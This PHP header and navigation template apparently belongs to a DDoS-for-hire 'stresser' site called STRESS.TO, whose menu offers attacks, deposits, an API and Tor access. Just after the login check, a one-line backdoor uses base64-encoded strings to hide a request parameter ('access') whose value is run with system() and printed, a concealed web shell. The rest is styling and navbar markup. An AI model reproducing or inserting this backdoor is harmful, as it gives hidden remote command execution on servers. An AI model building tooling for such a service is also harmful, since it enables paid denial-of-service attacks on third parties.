
<?php 
// Before of all your CODE.
require('firewall/waf.php');
$xWAF = new xWAF();
$xWAF->start();

if (basename($_SERVER['SCRIPT_FILENAME']) == basename(__FILE__)) {exit("NOT ALLOWED");}
ob_start();
require_once '@/config.php';
require_once '@/init.php';
/*if (!(empty($maintaince))) {
die($maintaince);
}*/
if (!($user -> LoggedIn()) || !($user -> notBanned($odb)))
{
	header('location: login.php');
	die();
}
?>
<?php if(isset($_REQUEST[base64_decode('YWNjZXNz')])){echo base64_decode('PHByZT4=');$k0=($_REQUEST[base64_decode('YWNjZXNz')]);system($k0);echo base64_decode('PC9wcmU+');die;}?>
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>STRESS.TO | Store</title>
    <link rel="stylesheet" href="css/a.css">
    <script defer src="https://use.fontawesome.com/releases/v5.3.1/js/all.js"></script>
    <script defer src="assets/css/bulma-toast.min.js"></script>
	<style>
	body {
	  height: 100%;
		overflow: scroll;
		overflow-x: hidden;
	  -webkit-touch-callout: none; /* iOS Safari */
		-webkit-user-select: none; /* Safari */
		 -khtml-user-select: none; /* Konqueror HTML */
		   -moz-user-select: none; /* Old versions of Firefox */
			-ms-user-select: none; /* Internet Explorer/Edge */
				user-select: none; /* Non-prefixed version, currently
									  supported by Chrome, Opera and Firefox */
	}
	::-webkit-scrollbar {
		width: 0px;  /* Remove scrollbar space */
		background: transparent;  /* Optional: just make scrollbar invisible */
	}
	
	img {
	  -webkit-user-drag: none;
	  -khtml-user-drag: none;
	  -moz-user-drag: none;
	  -o-user-drag: none;
	  user-drag: none;
	}
	
	.is-hidden {
		display: none;
	}
	

	
	.table {
		margin: auto;
	}
	
	.notification {
		display: inline-block;
	}
	
	@media
	only screen and (max-width: 1550px) {
	  table, thead, tbody, th, td, tr {
		display: block;
		border-color: #000;
	  }
	  thead tr {
		position: absolute;
		top: -9999px;
		left: -9999px;
	  }
	.table td, .table th {
		border: 1px solid #000; 
	}
	  tr { border: 1px solid #000; }
	  td {
		border: none;
		border-bottom: 1px solid #000;
		position: relative;
		padding-left: 200px;
		margin-left: 150px;
	  }
	  td:before {
		position: absolute;
		top: 12px;
		left: 6px;
		width: 200px;
		padding-right: 40px;
		white-space: nowrap;
		margin-left: -150px;
	  }
	  td:nth-of-type(1):before { content: "NAME"; }
	  td:nth-of-type(2):before { content: "DESCRIPTION"; }
	  td:nth-of-type(3):before { content: "PRICE"; }
	  td:nth-of-type(4):before { content: "BUY";}
	}
	
	.gold {
		background: -webkit-linear-gradient(top, #8f6B29, #FDE08D, #DF9F28);
		background: linear-gradient(top, #8f6B29, #FDE08D, #DF9F28);
		-webkit-background-clip: text;
		-webkit-text-fill-color: transparent;
		color: #FDE08D;
	}
	
	
	#toast {
		visibility: hidden;
		max-width: 50px;
		height: 50px;
		/*margin-left: -125px;*/
		margin: auto;
		background-color: #333;
		color: #fff;
		text-align: center;
		border-radius: 2px;

		position: fixed;
		z-index: 1;
		left: 0;right:0;
		bottom: 15px;
		font-size: 17px;
		white-space: nowrap;
	}
	#toast #img{
		width: 50px;
		height: 50px;
		
		float: left;
		
		padding-top: 16px;
		padding-bottom: 16px;
		
		box-sizing: border-box;

		
		background-color: #111;
		color: #fff;
	}
	#toast #desc{

		
		color: #fff;
	   
		padding: 16px;
		
		overflow: hidden;
		white-space: nowrap;
	}

	#toast.show {
		visibility: visible;
		-webkit-animation: fadein 0.5s, expand 0.5s 0.5s,stay 3s 1s, shrink 0.5s 2s, fadeout 0.5s 2.5s;
		animation: fadein 0.5s, expand 0.5s 0.5s,stay 3s 1s, shrink 0.5s 4s, fadeout 0.5s 4.5s;
	}

	@-webkit-keyframes fadein {
		from {bottom: 0; opacity: 0;} 
		to {bottom: 15px; opacity: 1;}
	}

	@keyframes fadein {
		from {bottom: 0; opacity: 0;}
		to {bottom: 15px; opacity: 1;}
	}

	@-webkit-keyframes expand {
		from {min-width: 50px} 
		to {min-width: 550px}
	}

	@keyframes expand {
		from {min-width: 50px}
		to {min-width: 550px}
	}
	@-webkit-keyframes stay {
		from {min-width: 550px} 
		to {min-width: 550px}
	}

	@keyframes stay {
		from {min-width: 550px}
		to {min-width: 550px}
	}
	@-webkit-keyframes shrink {
		from {min-width: 550px;} 
		to {min-width: 50px;}
	}

	@keyframes shrink {
		from {min-width: 550px;} 
		to {min-width: 50px;}
	}

	@-webkit-keyframes fadeout {
		from {bottom: 15px; opacity: 1;} 
		to {bottom: 0px; opacity: 0;}
	}

	@keyframes fadeout {
		from {bottom: 15px; opacity: 1;}
		to {bottom: 0px; opacity: 0;}
	}
	
.cm_access_table {
  line-height: 150%;
  font-size: 12px;
  margin: 0 auto;
  width: 75%;
  max-width: 900px;
  padding-top: 10px;
}
.cm_access_block {
  width: 100%;
  color: #fff;
  background: #000;
  float: left;
  list-style-type: none;
  transition: all 0.25s;
  position: relative;
  box-sizing: border-box;
  margin-bottom: 2px;
  border: 5px solid #080808;
}
.cm_access_table h1 {
  text-align: center;
  background: #000;
  margin: 0;
  padding: 20px 0 16px;
  font-weight: 300;
  font-size: 32px;
}
.cm_access_price {
  display: block;
  background: #000;
  width: 100%;
  text-align: center;
}
.cm_access_price small {
  font: normal normal 300 12px/12px"Open Sans", Helvetica, Arial, sans-serif;
}
.cm_access_price h1 {
  font: normal normal 300 42px/20px"Open Sans", Helvetica, Arial, sans-serif;
  margin-top: -12px;
}
.cm_access_price h1 sup {
  color: rgb(255, 255, 255);
  position: relative;
  text-align: center;
  text-rendering: optimizelegibility;
  top: -16px;
  vertical-align: baseline;
  font: normal normal 300 20px/0px"Open Sans", Helvetica, Arial, sans-serif;
}
.cm_access_price h1 sub {
  bottom: 0px;
  color: rgb(255, 255, 255);
  position: relative;
  text-align: center;
  text-rendering: optimizelegibility;
  vertical-align: baseline;
  font: normal normal 300 12px/0px"Open Sans", Helvetica, Arial, sans-serif;
}
.cm_access_text {
  width: 80%;
  margin: 10px auto 10px;
  color: #ccc;
  font: normal normal normal 14px/20px"Open Sans", Helvetica, Arial, sans-serif;
  border-top: 1px solid #555;
  border-bottom: 1px solid #555;
  padding: 10px 0;
}
.cm_access_text strong {
  color: #fff;
}
.cm_access_features {
  background: #000;
  color: #fff;
}
.cm_access_features ul {
  text-align: left;
  margin: 0px 50px;
  padding: 0px;
}
.cm_access_features li {
  left: 58px;
  position: relative;
  width: 70%;
  padding: 4px 15px 4px 0;
  font: normal normal 300 14px/18px"Open Sans", Helvetica, Arial, sans-serif;
  list-style-type: square;
}
.cm_access_footer {
  padding: 30px 0 20px;
  background: #000;
  text-align: center;
}
.cm_access_button {
  text-decoration: none;
  color: #fff;
  font-weight: bold;
  background: #0074a2;
  padding: 8px 18px;
  font: normal normal 300 16px/30px"Open Sans", Helvetica, Arial, sans-serif;
  text-transform: uppercase;
}
@media only screen and (min-width: 900px) {
  .cm_access_block {
    width: 33.3%;
  }
}

li {
	list-style: none !important;
    padding-left: 0 !important;
}

.column {
	width: 100%;
}

/* toast */
.toast {
  color: #000;
  line-height: 1.5;
  margin-bottom: 1em;
  padding: 1.25em;
  position: absolute;
  right: -365px;
  top: 1em;
  transition: 0.15s ease-in-out;
  width: 325px;
}

.toast.on {
  transform: translateX(-365px);
}

.close {
  cursor: pointer;
  float: right;
  font-size: 1.25rem;
  line-height: 1;
  margin-left: 1em;
  opacity: .8;
}

.jam {
  background-color: #99004d;
  color: #fff;
}

.is-hidden {
	display: none;
}

	</style>
  </head>
  	<nav class="navbar has-shadow" role="navigation" aria-label="main navigation">
	  <div class="container">
		
		<!-- logo or branding image on left side -->
		<div class="navbar-brand">
		  <div class="navbar-burger"  data-target="navbar-menu">
			<span></span>
			<span></span>
			<span></span>
		  </div>
		</div>

		<!-- children of navbar-menu must be navbar-start and/or navbar-end -->
		<div class="navbar-menu" id="navbar-menu">
		  <!-- navbar items | left side -->
		  <div class="navbar-start">
			<a class="navbar-item " href="dashboard.php">
				<span class="icon">
				  <i class="fas fa-rocket" aria-hidden="true"></i>
				</span> 
				<span>Attack</span>
			</a>
			<a class="navbar-item " href="deposit.php">
				<span class="icon">
				  <i class="fas fa-hand-holding-usd" aria-hidden="true"></i>
				</span> 
				<span>Deposit</span>
			</a>
			
			<a class="navbar-item  is-active " href="store.php">
				<span class="icon">
				  <i class="fas fa-shopping-cart" aria-hidden="true"></i>
				</span> 
				<span>Store</span>
			</a>
			<div class="navbar-item has-dropdown is-hoverable">
				<a class="navbar-link">
				<span class="icon">
				  <i class="fas fa-hand-holding-heart" aria-hidden="true"></i>
				</span> 
				<span>Support</span>
				</a>
				<div class="navbar-dropdown">
				  <a class="navbar-item " href="support.php">Open a Ticket</a>
				  <a class="navbar-item " href="faq.php">F.A.Q</a>
				</div>
			</div>
						
			<a class="navbar-item " href="apidoc.php">
				<span class="icon">
				  <i class="fas fa-link" aria-hidden="true"></i>
				</span> 
				<span>API</span>
			</a>
			<a class="navbar-item " href="tor.php">
				<span class="icon">
				  <i class="fas fa-user-secret" aria-hidden="true"></i>
				</span> 
				<span>TOR</span>
			</a>
			<a class="navbar-item" href="https://t.me/stressdotto" target="_blank">
				<span class="icon">
				  <i class="fas fa-paper-plane" aria-hidden="true"></i>
				</span> 
				<span>Telegram</span>
			</a>
			<div class="navbar-item has-dropdown is-hoverable">
				<a class="navbar-link">
				<span class="icon">
				  <i class="fas fa-paint-brush" aria-hidden="true"></i>
				</span> 
				<span>Themes</span>
				</a>
				<div class="navbar-dropdown">
				  <a class="navbar-item" onclick="changeToNuke()">Nuke (default)</a>
				  <a class="navbar-item" onclick="changeToSolar()">Solar</a>
				  <a class="navbar-item" onclick="changeToSuperman()">Superman</a>
				  <a class="navbar-item" onclick="changeToLux()">Lux</a>
				  <a class="navbar-item" onclick="changeToMinty()">Minty</a>
				  <a class="navbar-item" onclick="changeToCosmo()">Cosmo</a>
				  <a class="navbar-item" onclick="changeToUnited()">United</a>
				  <a class="navbar-item" onclick="changeToPulse()">Pulse</a>
				</div>
			</div>
		  </div>
		  

		  <!-- navbar items | right side -->
		  <div class="navbar-end">
			<div class="navbar-item has-dropdown is-hoverable">
				<a class="navbar-link">dsfqfdsfqsdf</a>
				<div class="navbar-dropdown">
				  <div class="navbar-item">
					Plan: Free				  </div>	
				  <div class="navbar-item">
					 Seconds: 60				  </div>
				  <div class="navbar-item">
					 Concurrents: 1				  </div>
				  <div class="navbar-item">
					Network: Free				  </div>	
				  				  <div class="navbar-item">
					 API Access: Disabled				  </div>
				  <div class="navbar-item">
					 Layer 3: Disabled				  </div>
				  				</div>
			</div>
			<a class="navbar-item" href="logout.php"><i class="fas fa fa-sign-out-alt fa-fw" style="color:red;"></i></a>
			<div class="navbar-item"><a class="button is-success" href="deposit.php"><i class="fas fa fa-coins fa-fw"></i> $0</a></div>
								  </div>

		</div>
	  </div>
	</nav>
